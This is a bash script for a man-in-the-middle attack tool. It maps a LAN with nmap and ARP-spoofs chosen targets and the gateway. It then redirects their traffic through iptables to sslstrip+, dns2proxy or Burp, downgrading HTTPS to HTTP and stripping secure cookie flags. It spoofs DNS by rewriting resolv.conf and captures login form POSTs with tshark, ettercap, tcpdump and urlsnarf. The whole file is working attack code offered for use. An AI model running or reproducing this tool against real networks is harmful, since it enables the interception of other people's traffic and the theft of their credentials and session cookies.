#!/bin/bash


trap " echo "" ; kill `pgrep xterm` 2> /dev/null 1> /dev/null ; sed -i 's/redir_command/#redir_command/g' /etc/ettercap/etter.conf ; exit " SIGINT SIGTERM
inpt=$( echo "$1 $2 $3 $4 $5 $6 $7 $8 $9 ${10} ${11} ${12} ${13} ${14} ${15} ${16} ${17} ${18} ${19} ${20} ${21} ${22} ${23} ${24} ${25}" )
if ! [[ $( echo $inpt | grep -wo '\-c') == '-c' ]] ; then
   normal='\e[0m' ; blue='\e[1;94m' ; red='\e[1;31m' ; yellow='\e[1;33m' ; ul='\e[1;4m' ; purp='\e[1;35m' ; green='\e[1;32m' ; white='\e[97m'
fi
date=$(date | awk {'print $4 '})

if [[ $inpt =~ '-I' ]] || [[ $inpt =~ '--iface-info' ]] ; then
   for i in $( ifconfig | awk {'print $1 '} | grep : | cut -d ':' -f 1 | grep -v lo ) ; do
      if [[ $( ifconfig $i | grep inet ) == "" ]] ; then
         continue
      else
         echo -e "${yellow}┌═════════════════════════════"
         echo -ne "${red}█${yellow}"
         interface=$i
         class=$(ip -d route | grep $interface | grep / | awk {' print $2 '} | cut -d '/' -f2)
         ifconfig $interface | grep -e $interface -e ether -e inet | grep -v inet6 | cut -d 'f' -f 1 | sed "s/$interface:/|||| $interface/g" | sed 's/  /\n/g' | uniq -u | grep -ve txqueuelen -ve Ethernet | sed 's/inet/Local-IP/g' | sed 's/netmask/Subnetmask/g' | sed 's/broadcast/Broadcast/g' | sed 's/ether/MAC-address/g' | column -ts ' ' | sed 's/|//g' | sed "s/$interface/${interface}\/${class}\n/g"
         ip -d route | grep $interface | grep via | awk {' print "Gateway      " $4 '}
         echo ""
      fi
   done
   echo "══════════════════════════════"
   exit
fi
if [[ $( echo $inpt | grep -w '\-t' ) =~ '-t' ]] || [[ $inpt == '--target' ]] ; then
   target=$( echo $inpt | sed 's/ /\n/g' | grep -e '-t' -e '--target' -A 1 | awk NR==2 )
else
   echo -e "${red}█ specify target(s)"
   exit 1
fi
if [[ $inpt =~ '-M' ]] || [[ $inpt =~ '--map-lan' ]] ; then
   arg=$( echo $inpt | sed 's/-M/Q/g' | sed 's/--map-lan/Q/g' )
   args=$( echo $arg | cut -d 'Q' -f2 )
   if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
   mkdir .workspace ; cd .workspace
   nmap -sn $target  > nmap.txt
   cat nmap.txt | grep -e "report" | tr ' ' '\n' | grep '\.' | sed 's/(//g' | sed 's/)//g' > ips.txt
   cat nmap.txt | grep -e "MAC Address" | awk {' print $3 '} > macs.txt
   cat nmap.txt | grep -e "MAC Address" | awk {' print $4" "$5" "$6" "$7" "$8'} > vendors.txt
   nmap -Pn -iL ips.txt $args |
   while read line ; do
      if [[ $line =~ "report" ]] ; then
         echo $line | sed 's/Nmap scan report for //g'
      else
         echo "    $line"
      fi
   done | grep -ve "Nmap" -e "Please report any incorrect results" -e "Host is up" -e "Not shown" -e "PORT STATE SERVICE" -e "MAC" |
   while read line ; do
      if [[ $line =~ '(' ]] && [[ $line =~ $( head ips.txt -n 1 | cut -d "." -f 1 ) ]] ; then
         echo $line | awk {' print $2 '} |  sed 's/(//g' | sed 's/)//g'
      else
        echo $line
      fi
   done | awk NF > nmp.txt
   x=1
   cat nmp.txt | while read i ; do
      if [[ $( cat ips.txt ) =~ "$i" ]] && [[ $i =~ $( head ips.txt -n 1 | cut -d "." -f 1 ) ]] ; then
         local_ip=$(ifconfig $interface | grep "inet " | awk {' print $2 '})
         mac_addr=$(ifconfig $interface | grep "ether" | awk {' print $2 '})
         if [[ $i =~ $local_ip ]] ; then
            echo -e "${red}█ ${blue}$local_ip \t ${yellow}$mac_addr \t ${green}(You)"
         else
            echo -e "${red}█ $blue`cat ips.txt | awk NR==$x` \t $yellow`cat macs.txt | awk NR==$x` ${green}`cat vendors.txt | awk NR==$x`"
         fi
         let x=$x+1
      else
         if [[ $i =~ '|' ]] ; then
            if [[ $i =~ "VULNERABLE" ]] ; then
              ii=$(echo $i | sed 's/VULNERABLE/\\e[1;31m VULNERABLE/g')
              echo -e "${green}        ║__ $purp $ii"
            else
              echo -e "${green}        ║__ $purp $i"
            fi
         else
            echo -e "${green}     ║ $white $i"
         fi
      fi
   done
   echo
   exit
fi
if [[ $( echo $inpt | grep -w '\-i' ) =~ '-i' ]] || [[ $inpt =~ '--interface' ]] ; then
   interface=$( echo $inpt | sed 's/ /\n/g' | grep -e '-i' -e '--interface' -A 1 | awk NR==2 )
else
   echo -e "${red}█ specify an interface"
   exit 1
fi
if [[ $inpt =~ '-g' ]] || [[ $inpt =~ '--gateway' ]] ; then
   gateway=$( echo $inpt | sed 's/ /\n/g' | grep -e '-g' -e '--gateway' -A 1 | awk NR==2 )
else
   echo -e "${red}█ specify gateway"
   exit 1
fi
if   [[ $inpt =~ '-o' ]] || [[ $inpt =~ '--savelog'    ]] ; then
   savelog=$( echo $inpt | sed 's/ /\n/g' | grep -e '-o' -e '--savelog' -A 1 | awk NR==2 )
fi

if [[ $( echo $inpt | grep -w '\-d' ) =~ '-d' ]] ||  [[ $inpt == '--driftnet' ]] ; then
   driftnet='on'
fi
if [[ $( echo $inpt | grep -w '\-m' ) ]] ||  [[ $inpt =~ '--tcpdump'    ]] ; then
   tcpdump='on'
fi
if [[ $inpt =~ '-f' ]] || [[ $inpt =~ '--forward' ]] ; then
   forward='off'
fi
if [[ $inpt =~ '-C' ]] || [[ $inpt =~ '--no-check' ]] ; then
   nocheck='on'
fi
if [[ $inpt =~ "-u" ]] || [[ $inpt =~ "--urlsnarf" ]] ; then
   urlsnarf='on'
fi
if [[ $inpt =~ '-s' ]] || [[ $inpt =~ '--silent' ]] ; then
   silent='on'
fi
if [[ $( echo $inpt | grep -w '\-k' ) =~ '-k' ]] || [[ $inpt =~ '--tshark' ]] ;then
   tshark='on'
fi
if [[ $inpt =~ '-e' ]] || [[ $inpt =~ '--ettercap' ]] ; then
   ettercap='on'
fi
if [[ $inpt =~ '-r' ]] || [[ $inpt =~ '--iptraf' ]] ; then
   iptraf='on'
fi

if [[ $inpt =~ '-K' ]] || [[ $inpt =~ '--tshark+' ]] ; then
   tshark2='on'
fi

if [[ $inpt =~ '-x' ]] || [[ $inpt =~ '--burp' ]] ; then
   burp='on'
elif [[ $inpt =~ '-H' ]] || [[ $inpt =~ '--hsts' ]] ; then
   hsts='on'
fi

if ! [[ -d output ]] ; then
   mkdir output
fi
if [[ $inpt =~ '-p' ]] || [[ $inpt =~ '--dnsspoof'  ]] ; then dnsspoof="on" ; fi
cd output
mkdir "${date}_output"

if ! [[ $( ifconfig ) =~ "command not found" ]] ; then
   distro=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
   case $distro in
       Kali)       myip=`ifconfig $interface | egrep -w "inet" | awk '{print $2}'`;;
       Debian)     myip=`ifconfig $interface | egrep -w "inet" | awk '{print $2}'`;;
       Mint)       myip=`ifconfig $interface | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
       Ubuntu)     myip=`ifconfig $interface | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
       Parrot)     myip=`ifconfig $interface | egrep -w "inet" | awk '{print $2}'`;;
       BackBox)    myip=`ifconfig $interface | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
       elementary) myip=`ifconfig $interface | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
   esac
else
   myip=$(ip -d route | grep wlan0 | grep -e /24 -e /16 | awk {' print $10 '})
fi
subnet=$(ip -d route | grep $interface | grep / | awk {'print $2 '})

############################################################################################################

cd "${date}_output"
echo -e "${red}█ Time $date"
echo -e "${red}█ Distro $distro"
echo -e "${red}█ Interface $interface"
echo -e "█ Local IP $myip"
echo -e "█ Gateway $gateway"
echo -e "█ Target(s) $target"
function iptables_hsts {
   echo -e "${yellow}█ iptables --flush"
   echo -e "${blue}█ iptables --flush -t nat"
   echo -e "${red}█ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000"
   echo -e "${green}█ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53 "
   echo -e "$blue█ Enable SSLstrip+"
   iptables --flush
   iptables --flush -t nat
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
   iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
   if [[ $savelog == "" ]] ; then
      echo -en "${purp}█ Do you want to save sslstrip+ logs at ${white}log.txt [y/n]: " ; read logz
      if [[ $logz == "y" ]] || [[ $logz == "Y" ]] ; then
            echo -e "${green}█ saving session logs at log.txt"
            sslstrip -l 9000 -a -w log.txt 2> /dev/null 1> /dev/null &
         else
         echo -e "${red}█ NO Logs will be saved for this session"
          sslstrip -l 9000 -a 2> /dev/null 1> /dev/null &
      fi
    else
      echo -e "${green}█ saving session logs at $savelog"
      sslstrip -l 9000 -a -w $savelog 2> /dev/null 1> /dev/null  &
   fi
}

function dns_2_proxy {
   if [[ -d ../../dns2proxy ]] ; then
      cd ../../dns2proxy
      if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
         python dns2proxy.py 1> /dev/null 2> /dev/null &
      else
         xterm -geometry 90x30-0-0 -fg blue -e bash -c "python dns2proxy.py" &
      fi
      cd ..
      cd output/"${date}_output"
   elif [[ -d dns2proxy ]] ; then
      cd dns2proxy
      if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
         python dns2proxy.py 1> /dev/null 2> /dev/null &
      else
         xterm -geometry 90x30-0-0 -fg blue -e bash -c "python dns2proxy.py" &
      fi
      cd ..
      cd output/"${date}_output"
   else
      echo -e "${red}█ dns2proxy doesn't exist"
      exit
   fi
}

function iptables_burp {
   iptables --flush
   iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --to-destination $myip
   iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $myip
   echo -en "${yellow}"
   echo "█ iptables --flush"
   echo '█ Iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --in-interface'" $interface"' --to-destination'" $myip"
   echo '█ Iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --in-interface'" $interface "'--to-destination'" $myip"
   if [[ $burp == "on" ]] ; then
      echo '█ Now open Burpsuite > Proxy > Options'
      echo '█ Add proxy Listeners on ports 443,80 .. enable ( Support Invisible Proxying )'
      echo '█ And in Response Modification Enable ( Convert HTTPS links to HTTP )'
      echo '█ And ( Remove secure Flag from cookies )'
   elif [[ $mitmproxy == "on" ]] ; then
        xterm -geometry 90x30-0-0 -e "mitmproxy -T -p 443 -v -e $proxyargs" &
        xterm -geometry 90x30-300-0 -e "mitmproxy -T -p 80 -v -e $proxyargs" &
   fi
}
function scan {
   echo -e "${blue}█ Enable ARPspoof"
   if [[ $target =~ '/24' ]] || [[ $target == "/16" ]] ; then
      echo -e "${white}█ Scanning subnet ..."
      arp-scan $target 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | awk {' print $1 "   " $2 '} > ips_macs.txt
      cat ips_macs.txt | awk {' print $1 '} > ips.txt
      cat ips.txt | grep -wve $gateway -e $myip | sed '/^\s*$/d' > ipst.txt
      xx=10
      xxx=380
      for i in $(seq 1 $(wc -l ipst.txt | awk {' print $1 '})) ; do
         t1=`awk NR==$i ipst.txt`
         if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
            arpspoof -t $gateway $t1 -r 2> /dev/null 1> /dev/null &
         else
            xterm -geometry 90x20-$xx-$xxx  -fg red -e arpspoof -t $gateway $t1 -r &
         fi
         echo -e "${green}█ spoof Target $t1"
         let xx+=10
         let xxx+=10
      done
   elif [[ $target =~ `echo $gateway | cut -d "." -f1,2,3` ]] ; then
       function action
       {
          if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
             arpspoof -t $gateway $i -r 1> /dev/null 2> /dev/null &
          else
             xterm -geometry 90x20-20-400  -fg red -e arpspoof -t $gateway $i -r &
          fi
             echo -e "${green}█ spoof Target $i"
             arp-scan $i 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | awk {' print $1 "   " $2 '} >> ips_macs.txt
       }
       if [[ $target =~ "," ]] ; then
          for i in `echo $target | sed 's/,/\n/g'` ; do
             ping -c 1 $i > ip_st.txt
             if [[ $nocheck == "on" ]] ; then
                action
             else
                if [[ $( cat ip_st.txt ) =~ "Unreachable" ]] || [[ $( cat ip_st.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_st.txt ) =~ '0 received' ]] ; then
                   echo -e "${red}█ $i is Unreachable, if IP is blocking ICMP packets run with --no-check"
                else
                    action
                fi
             fi
          done
       elif ! [[ $target =~ "," ]] ; then
          function action1
          {
             if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
                arpspoof -i $interface -t $gateway $target -r 2> /dev/null 1> /dev/null &
             else
                xterm -geometry 90x20-20-400  -fg red -e arpspoof -i $interface -t $gateway $target -r &
             fi
             echo -e "${green}█ spoof Target $target"
             arp-scan $target 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | grep $target | awk {' print $1 "   " $2 '} > ips_macs.txt
          }
          ping -c 1 $target > ip_st.txt
          if [[ $nocheck == "on" ]] ; then
              action1
          else
             if [[ $( cat ip_st.txt ) =~ "Unreachable" ]] || [[ $( cat ip_st.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_st.txt ) =~ '0 received' ]] ; then
                echo -e "${red}█ $target is Unreachable, if IP is blocking ICMP packets run with --no-check"
                exit
             else
                action1
             fi
          fi
       else
          echo -e "${red}█ Couldn't identify target(s)"
          exit
       fi
   fi
   echo -e "$blue█ spoof Gateway $gateway"

}

function capture_creds {
   if [[ $ettercap == "on" ]] || [[ $ettercap == "ON" ]] && [[ $tshark == "on" ]] || [[ $tshark == "ON" ]] ; then
      echo -e "${blue}█ Enable Tshark"
      echo -e "${blue}█ Enable Ettercap"
      xterm -geometry 90x55+0+100 -fg green -e bash -c "tshark -i $interface -Y 'http.request.method == POST' -VVV | grep -i form" &
      xterm -geometry 90x55-550+100 -fg purple -e bash -c "ettercap -Tq -w dump" &
   elif [[ $ettercap == "on" ]] || [[ $ettercap == "ON" ]] ; then
      echo -e "${blue}█ Enable Ettercap"
      xterm -geometry 90x55+0+100 -fg green -e bash -c "ettercap -Tq -w dump" &
   elif [[ $tshark == "on" ]] || [[ $tshark == "ON" ]] ; then
      echo -e "${blue}█ Enable Tshark"
      xterm -geometry 90x55+0+100 -fg green -e bash -c "tshark -i $interface -Y 'http.request.method == POST' -VVV | grep -i form" &
   fi
   if [[ $driftnet == "on" ]] || [[ $driftnet == "ON" ]] ; then
      echo -e "$blue█ Enable Driftnet"
   fi
   if [[ $tshark == "on" ]] || [[ $driftnet == "on" ]] ; then
      echo -e "${blue}█ Saving captured packets at ${date}_output/tshark.pcap"
      if [[ $silent == 'on' ]] ; then
         tshark -i wlan0 -w tshark.pcap 2> /dev/null 1> /dev/null &
      else
         xterm -geometry 90x10+0-0 -fg white -e "tshark -i $interface -w tshark.pcap" &
      fi
   fi
   if [[ $tcpdump == "on" ]] ; then
      echo -e "${blue}█ Enable TCPdump"
      xterm -geometry 90x55+0+100 -fg white -e bash -c "tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'" &
   fi
   if [[ $iptraf == "on" ]] ; then
      echo -e "${blue}█ Enable IPtraf-ng"
     xterm -geometry 90x50-0-0 -fg white -e "iptraf-ng -i $interface" &
   fi
   if [[ $urlsnarf == "on" ]] || [[ $urlsnarf == "ON" ]] ; then
      echo -e "${blue}█ Enable urlsnarf"
      urlsnarf > urlsnarf.log 2> /dev/null &
      echo -e "${green}█ saving urlsnarf logs at output/${date}_output/urlsnarf.log"
   fi
   if [[ $etherape == "on" ]] ; then
      echo -e "${blue}█ Enable Etherape"
      etherape 2> /dev/null 1> /dev/null &
   fi
   if [[ $tshark2 == "on" ]] ; then
      echo -e "${blue}█ Enable Tshark+ "
       xterm -geometry 90x20-0-0 -fg orange -e "tshark -i $interface -Y 'http.request.method == GET || http.request.method == POST'" &
   fi
   if [[ $dnsspoof == "on" ]] ; then
      cd ../..
      if [[ -f $( echo $inpt | sed 's/ /\n/g' | grep -e '-p' -e '--dnsspoof' -A 1 | awk NR==2 ) ]] ; then
         dnsfile=$( echo $inpt | sed 's/ /\n/g' | grep -e '-p' -e '--dnsspoof' -A 1 | awk NR==2 )
         if ! [[ -f /etc/resolv.conf ]] ; then
             echo "nameserver $gateway" > /etc/resolv.conf
         fi
         echo -e "${yellow}█ Modify resolv.conf file"
         cp /etc/resolv.conf /etc/resolv.conf.copy
         echo "nameserver 127.0.0.1" > /etc/resolv.conf
         cp $dnsfile dns2proxy/domains.cfg
         if ! [[ $hsts == 'on' ]] ; then
             dns_2_proxy
         fi
      else
         echo -e "${red}█ Couldn't find dns file to spoof with"
         exit 1
      fi
   fi
}


if [[ $hsts == 'on' ]] ; then
       echo -e "$red█ Activating HSTS mode "
       iptables_hsts
       dns_2_proxy
elif [[ $burp == 'on' ]] ; then
       echo -e "${red}█ Activating Burp mode "
       iptables_burp
fi
echo -e "${purp}█ echo 1 > /proc/sys/net/ipv4/ip_forward"
echo 1 > /proc/sys/net/ipv4/ip_forward
scan
capture_creds
if [[ $nocheck != "on" ]] ; then
   echo -e "${blue}█ Activating respoofer, My gift to the MITM world :)"
   xterm -geometry 90x15-0-0 -fg green -T respoofer -e bash -c "../../respoof.sh $interface" &
fi

while true ; do
    echo -en "${blue}█ Exit [Y]: "
    read f 2> /dev/null
    if [[ $f == "y" ]] || [[ $f == "Y" ]] ; then
       kill `pgrep xterm`    2> /dev/null 1> /dev/null
       kill `pgrep driftnet` 2> /dev/null 1> /dev/null
       kill `pgrep arpspoof` 2> /dev/null 1> /dev/null
       kill `pgrep sslstrip` 2> /dev/null 1> /dev/null
       iptables --flush
       for i in $( ps -aux | grep dns2proxy | awk {' print $2 '} ) ; do
          kill $i 2> /dev/null 1> /dev/null
       done
       if [[ $dnsspoof == "on" ]] ; then
          cd ../../dns2proxy
          echo "" > domains.cfg
          echo "nameserver $gateway" > /etc/resolv.conf
          echo -e "${yellow}█ Restore DNSserver default settings"
       fi
       if [[ $driftnet == "on" ]] || [[ $driftnet == "ON" ]] ; then
          echo -e "$blue█ Extracting photos from pcap file with drifnet"
          timeout 60 driftnet -f tshark.pcap -a -d . 2> /dev/null 1> /dev/null
       fi
       exit
    fi
done
